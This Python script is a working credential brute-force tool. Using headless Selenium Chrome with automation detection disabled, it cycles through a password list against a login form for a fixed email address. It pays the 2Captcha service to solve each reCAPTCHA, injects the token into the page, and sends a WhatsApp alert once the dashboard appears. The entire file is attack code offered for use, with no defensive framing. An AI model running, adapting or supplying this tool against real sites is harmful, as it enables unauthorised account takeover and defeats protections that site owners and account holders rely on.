import contextlib
from time import sleep
from selenium import webdriver
from twocaptcha import TwoCaptcha
from os import environ as env_variable
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from python_whatsapp_bot import Whatsapp, Inline_list, List_item

def main():
    NUMBER: str = env_variable.get("MY_NUMBER")  # Your WhatsApp Number e.g: 234xxxxxxxxxx
    NUM_ID: str = env_variable.get("NUM_ID")  # Your Number ID
    TOKEN: str =  env_variable.get("TOKEN")  # Token
    API_2CAPTCHA_KEY: str = env_variable.get("API_2CAPTCHA_KEY")  # 2Captcha API Key

    driverpath: str = "C:\\Users\\LmAo\\Documents\\AAA_Testing\\Bypass-Captcha-Bruteforce\\driver\\chromedriver.exe"

    solver = TwoCaptcha(API_2CAPTCHA_KEY)

    service = Service(executable_path=driverpath)
    options = Options()
    options.add_experimental_option('useAutomationExtension', False)
    options.add_experimental_option(
        "excludeSwitches", ["enable-automation", 'enable-logging'])
    options.add_argument('--headless')
    options.add_argument('--disable-blink-features=AutomationControlled')
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_window_size(700, 730)
    driver.set_window_position(676, 0)
    wa_bot = Whatsapp(number_id=NUM_ID, token=TOKEN)

    print("Opening Site...")
    url: str = 'https://targetsite.com'
    driver.get(url)

    placeholder: str = ''
    email: str = 'name@domain.com'  # Or Desired Username/User_id e.t.c
    email_field = driver.find_element(By.XPATH, '//input[@id="email"]')
    pass_field = driver.find_element(By.XPATH, '//input[@id="password"]')
    driver.execute_script("arguments[0].setAttribute('type', 'text')", pass_field)
    sitekey = driver.find_element(By.XPATH, '//div[@class="g-recaptcha "]').get_attribute('data-sitekey')

    with open("passwords.txt", "r") as f:
        passwords = f.read().splitlines()
        
    for idx, password in enumerate(passwords):
        while True:
            with contextlib.suppress(Exception):
                iframe = driver.find_element(By.XPATH, '//iframe[@title="reCAPTCHA"]')
                break
            
        try:
            if idx + 1 == 1:
                email_field.send_keys(email)
                pass_field.send_keys(password)
                print(f"\r{idx + 1}. {password=} | Solving Captcha => ", end='')
            else: 
                pass_field.clear()
                pass_field.send_keys(password)
                driver.find_element(By.XPATH, '//div[@id="templateContainer"]').click()
                print(f"\n{idx + 1}. {password= } | Solving Captcha => Retrying... ", end='')
            
            result = solver.recaptcha(url=url, sitekey=sitekey,)

            g_response: str = result["code"]

            driver.execute_script('var element=document.getElementById("g-recaptcha-response"); element.style.display="";')
            driver.execute_script("""document.getElementById("g-recaptcha-response").innerHTML = arguments[0]""", g_response)
            driver.execute_script('var element=document.getElementById("g-recaptcha-response"); element.style.display="none";')

            driver.find_element(By.XPATH, '//div[@id="login-main-btn"]').click()

            sleep(3)

            if 'dashboard' in driver.current_url:
                print(f"\r{idx + 1}. Access Granted. 🎉 {placeholder:>40}\nCorrect Password: '{password:<1}'.", end='')
                wa_bot.send_message(NUMBER, "We are logged in. 👍", reply_markup=Inline_list("Reply", \
                    list_items=[List_item("Niceee"), List_item("Yeeee 🎉"), List_item("Awesome")]))
                break
            else:
                print(f"\r{password:<1} Failed. 😕{placeholder:>40}", end='')
                driver.execute_script("arguments[0].src = arguments[1].src", iframe, iframe)
        except Exception as e: print(e)  # sys.exit(e)
        finally: driver.switch_to.default_content()
    

if __name__ == "__main__":
    main()